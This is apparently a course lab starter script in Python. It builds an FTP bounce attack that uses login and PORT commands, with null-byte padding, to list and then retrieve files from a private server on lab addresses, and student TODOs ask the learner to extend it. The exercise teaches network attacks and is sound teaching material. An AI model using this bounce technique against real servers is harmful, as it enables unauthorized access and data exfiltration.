import sys, os
from cp_ftp import FTP

ftp = FTP("192.168.56.101", debug=True)
ftp.send_login_commands("student", "golyeeHug6")

################################################################################
# Builds a script to get a LIST of files on the private server.
################################################################################

# 1. Commands to log in.
login_commands = ftp.get_login_commands("student", "golyeeHug6")

# 2. A PORT command for how to get data back to this script from the private server.
exfiltration_data_address = ftp.new_data_address()
port_command = ftp.get_port_command(exfiltration_data_address)

# 3. Build up the list of commands.
exploit_command_list = []
exploit_command_list.append(login_commands)
exploit_command_list.append(port_command)
################################################################################
# STUDENT: To begin with this just LISTs files on the private server.
# Once you have this script working, try RETRieving the contents of the files
# it lists.
################################################################################
exploit_command_list.append("LIST")
exploit_command_list.append("QUIT")

# 4. Put the commands together. Pad with 1M nullbytes to ensure socket stays open long enough.
exploit_commands = "\r\n".join(exploit_command_list) + "\0" * 1000000
print("exploit_commands:\n%s" % exploit_commands)

################################################################################
# STUDENT TODO: Get exploit_commands to be run on the 192.168.56.102 server.
################################################################################

ftp.close()
